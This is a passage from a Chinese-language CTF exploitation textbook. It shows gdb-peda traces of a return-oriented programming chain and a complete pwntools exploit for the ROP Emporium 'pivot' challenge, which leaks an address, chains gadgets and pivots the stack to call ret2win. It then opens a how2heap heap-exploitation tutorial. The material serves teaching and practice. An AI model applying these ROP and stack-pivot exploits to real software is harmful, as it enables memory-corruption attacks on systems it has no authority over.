ECX: 0x54 ('T')
EDX: 0xf7731854 --> 0x0
ESI: 0xf772fe28 --> 0x1d1d30
EDI: 0x0
EBP: 0x0
ESP: 0xf755cf18 --> 0x804a024 --> 0xf7772770 (: push ebp)
EIP: 0x80488c0 (: pop eax)
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT dire
ction overflow)
[-------------------------------------code----------------------
---------------]
0x80488ba: xchg ax,ax
0x80488bc: xchg ax,ax
0x80488be: xchg ax,ax
=> 0x80488c0 : pop eax
0x80488c1 : ret
0x80488c2 : xchg esp,eax
0x80488c3 : ret
0x80488c4 : mov eax,DWORD PTR [eax]
[------------------------------------stack----------------------
---------------]
0000| 0xf755cf18 --> 0x804a024 --> 0xf7772770 (: push ebp)
0004| 0xf755cf1c --> 0x80488c4 (: mov e
ax,DWORD PTR [eax])
0008| 0xf755cf20 --> 0x8048571 (: pop ebx)
0012| 0xf755cf24 --> 0x1f7
0016| 0xf755cf28 --> 0x80488c7 (: add e
ax,ebx)
0020| 0xf755cf2c --> 0x80486a3 (:
call eax)
0024| 0xf755cf30 --> 0xa ('\n')
0028| 0xf755cf34 --> 0x0
[---------------------------------------------------------------
---------------]
Legend: code, data, rodata, value
0x080488c0 in usefulGadgets ()
gdb-peda$ n
418
3.1.4 返回导向编程（ROP）（x86）
[----------------------------------registers--------------------
---------------]
EAX: 0x804a024 --> 0xf7772770 (: push e
bp)
EBX: 0x0
ECX: 0x54 ('T')
EDX: 0xf7731854 --> 0x0
ESI: 0xf772fe28 --> 0x1d1d30
EDI: 0x0
EBP: 0x0
ESP: 0xf755cf1c --> 0x80488c4 (: mov e
ax,DWORD PTR [eax])
EIP: 0x80488c1 (: ret)
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT dire
ction overflow)
[-------------------------------------code----------------------
---------------]
0x80488bc: xchg ax,ax
0x80488be: xchg ax,ax
0x80488c0 : pop eax
=> 0x80488c1 : ret
0x80488c2 : xchg esp,eax
0x80488c3 : ret
0x80488c4 : mov eax,DWORD PTR [eax]
0x80488c6 : ret
[------------------------------------stack----------------------
---------------]
0000| 0xf755cf1c --> 0x80488c4 (: mov e
ax,DWORD PTR [eax])
0004| 0xf755cf20 --> 0x8048571 (: pop ebx)
0008| 0xf755cf24 --> 0x1f7
0012| 0xf755cf28 --> 0x80488c7 (: add e
ax,ebx)
0016| 0xf755cf2c --> 0x80486a3 (:
call eax)
0020| 0xf755cf30 --> 0xa ('\n')
0024| 0xf755cf34 --> 0x0
0028| 0xf755cf38 --> 0x0
[---------------------------------------------------------------
---------------]
419
3.1.4 返回导向编程（ROP）（x86）
Legend: code, data, rodata, value
0x080488c1 in usefulGadgets ()
gdb-peda$ n
[----------------------------------registers--------------------
---------------]
EAX: 0x804a024 --> 0xf7772770 (: push e
bp)
EBX: 0x0
ECX: 0x54 ('T')
EDX: 0xf7731854 --> 0x0
ESI: 0xf772fe28 --> 0x1d1d30
EDI: 0x0
EBP: 0x0
ESP: 0xf755cf20 --> 0x8048571 (: pop ebx)
EIP: 0x80488c4 (: mov eax,DWORD PTR [ea
x])
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT dire
ction overflow)
[-------------------------------------code----------------------
---------------]
0x80488c1 : ret
0x80488c2 : xchg esp,eax
0x80488c3 : ret
=> 0x80488c4 : mov eax,DWORD PTR [eax]
0x80488c6 : ret
0x80488c7 : add eax,ebx
0x80488c9 : ret
0x80488ca : xchg ax,ax
[------------------------------------stack----------------------
---------------]
0000| 0xf755cf20 --> 0x8048571 (: pop ebx)
0004| 0xf755cf24 --> 0x1f7
0008| 0xf755cf28 --> 0x80488c7 (: add e
ax,ebx)
0012| 0xf755cf2c --> 0x80486a3 (:
call eax)
0016| 0xf755cf30 --> 0xa ('\n')
0020| 0xf755cf34 --> 0x0
0024| 0xf755cf38 --> 0x0
0028| 0xf755cf3c --> 0x0
420
3.1.4 返回导向编程（ROP）（x86）
[---------------------------------------------------------------
---------------]
Legend: code, data, rodata, value
0x080488c4 in usefulGadgets ()
gdb-peda$ n
[----------------------------------registers--------------------
---------------]
EAX: 0xf7772770 (: push ebp)
EBX: 0x0
ECX: 0x54 ('T')
EDX: 0xf7731854 --> 0x0
ESI: 0xf772fe28 --> 0x1d1d30
EDI: 0x0
EBP: 0x0
ESP: 0xf755cf20 --> 0x8048571 (: pop ebx)
EIP: 0x80488c6 (: ret)
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT dire
ction overflow)
[-------------------------------------code----------------------
---------------]
0x80488c2 : xchg esp,eax
0x80488c3 : ret
0x80488c4 : mov eax,DWORD PTR [eax]
=> 0x80488c6 : ret
0x80488c7 : add eax,ebx
0x80488c9 : ret
0x80488ca : xchg ax,ax
0x80488cc : xchg ax,ax
[------------------------------------stack----------------------
---------------]
0000| 0xf755cf20 --> 0x8048571 (: pop ebx)
0004| 0xf755cf24 --> 0x1f7
0008| 0xf755cf28 --> 0x80488c7 (: add e
ax,ebx)
0012| 0xf755cf2c --> 0x80486a3 (:
call eax)
0016| 0xf755cf30 --> 0xa ('\n')
0020| 0xf755cf34 --> 0x0
0024| 0xf755cf38 --> 0x0
0028| 0xf755cf3c --> 0x0
421
3.1.4 返回导向编程（ROP）（x86）
[---------------------------------------------------------------
---------------]
Legend: code, data, rodata, value
0x080488c6 in usefulGadgets ()
pivot
基本同上，但你可以尝试把修改 rsp 的部分也用 gadgets 来实现，这样做的好处是
我们不需要伪造一个堆栈，即不用管 ebp 的地址。如：
payload_2 = "A" * 40
payload_2 += p64(pop_rax)
payload_2 += p64(leakaddr)
payload_2 += p64(xchg_rax_rsp)
实际上，我本人正是使用这种方法，因为我在构建 payload
时， 0x0000000000400ae0 : leave ，leave;ret 的地址存在截断字符
0a ，这样就不能通过正常的方式写入缓冲区，当然这也是可以解决的，比如先将
0a 换成非截断字符，之后再使用寄存器将 0a 写入该地址，这也是通常解决缓
冲区中截断字符的方法，但是这样做难度太大，不推荐，感兴趣的读者可以尝试一
下。
$ ropgadget --binary pivot --only "mov|pop|call|add|xchg|ret"
0x0000000000400b09 : add rax, rbp ; ret
0x000000000040098e : call rax
0x0000000000400b05 : mov rax, qword ptr [rax] ; ret
0x0000000000400b00 : pop rax ; ret
0x0000000000400900 : pop rbp ; ret
0x0000000000400b02 : xchg rax, rsp ; ret
from pwn import *
#context.log_level = 'debug'
#context.terminal = ['konsole']
io = process('./pivot')
elf = ELF('./pivot')
422
3.1.4 返回导向编程（ROP）（x86）
libp = ELF('./libpivot.so')
leave_ret = 0x0000000000400adf
foothold_plt = elf.plt['foothold_function'] # 0x400850
foothold_got_plt = elf.got['foothold_function'] # 0x602048
pop_rax = 0x0000000000400b00
pop_rbp = 0x0000000000400900
mov_rax_rax = 0x0000000000400b05
xchg_rax_rsp = 0x0000000000400b02
add_rax_rbp = 0x0000000000400b09
call_rax = 0x000000000040098e
foothold_sym = libp.symbols['foothold_function']
ret2win_sym = libp.symbols['ret2win']
offset = int(ret2win_sym - foothold_sym) # 0x14e
leakaddr = int(io.recv().split()[20], 16)
# calls foothold_function() to populate its GOT entry, then quer
ies that value into EAX
#gdb.attach(io)
payload_1 = p64(foothold_plt)
payload_1 += p64(pop_rax)
payload_1 += p64(foothold_got_plt)
payload_1 += p64(mov_rax_rax)
payload_1 += p64(pop_rbp)
payload_1 += p64(offset)
payload_1 += p64(add_rax_rbp)
payload_1 += p64(call_rax)
io.sendline(payload_1)
# rsp = leakaddr
payload_2 = "A" * 40
payload_2 += p64(pop_rax)
payload_2 += p64(leakaddr)
payload_2 += p64(xchg_rax_rsp)
423
3.1.4 返回导向编程（ROP）（x86）
io.sendline(payload_2)
print io.recvall()
这样基本的 ROP 也就介绍完了，更高级的用法会在后面的章节中再介绍，所谓的
高级，也就是 gadgets 构造更加巧妙，运用操作系统的知识更加底层而已。
更多资料
ROP Emporium
一步一步学 ROP 系列
64-bit Linux Return-Oriented Programming
Introduction to return oriented programming (ROP)
Return-Oriented Programming:Systems, Languages, and Applications
Practical Return-Oriented Programming
424
3.1.5 返回导向编程（ROP）（ARM）
3.1.5 返回导向编程（ROP）（ARM）
425
3.1.6 Linux 堆利用（一）
3.1.6 Linux 堆利用（上）
Linux 堆简介
how2heap
first_fit
fastbin_dup
fastbin_dup_into_stack
fastbin_dup_consolidate
unsafe_unlink
house_of_spirit
参考资料
Linux 堆简介
堆是程序虚拟地址空间中的一块连续的区域，由低地址向高地址增长。当前 Linux
使用的堆分配器被称为 ptmalloc2，在 glibc 中实现。
更详细的我们已经在章节 1.5.8 中介绍了，章节 1.5.7 中也有相关内容，请回顾一
下。
对堆利用来说，不用于栈上的溢出能够直接覆盖函数的返回地址从而控制 EIP，只
能通过间接手段来劫持程序控制流。
how2heap
how2heap 是由 shellphish 团队制作的堆利用教程，介绍了多种堆利用技术，这篇
文章我们就通过这个教程来学习。推荐使用 Ubuntu 16.04 64位系统环境，glibc 版
本如下：
$ file /lib/x86_64-linux-gnu/libc-2.23.so
/lib/x86_64-linux-gnu/libc-2.23.so: ELF 64-bit LSB shared object
, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter
/lib64/ld-linux-x86-64.so.2, BuildID[sha1]=088a6e00a1814622219f
346b41e775b8dd46c518, for GNU/Linux 2.6.32, stripped
426
3.1.6 Linux 堆利用（一）
$ git clone https://github.com/shellphish/how2heap.git
$ cd how2heap
$ make
请注意，下文中贴出的代码是我简化过的，剔除和修改了一些不必要的注释和代
码，以方便学习。另外，正如章节 4.3 中所讲的，添加编译参数 CFLAGS += -
fsanitize=address 可以检测内存错误。下载文件
first_fit
#include 
#include 
#include 
int main() {
char* a = malloc(512);
char* b = malloc(256);
char* c;
fprintf(stderr, "1st malloc(512): %p\n", a);
fprintf(stderr, "2nd malloc(256): %p\n", b);
strcpy(a, "AAAAAAAA");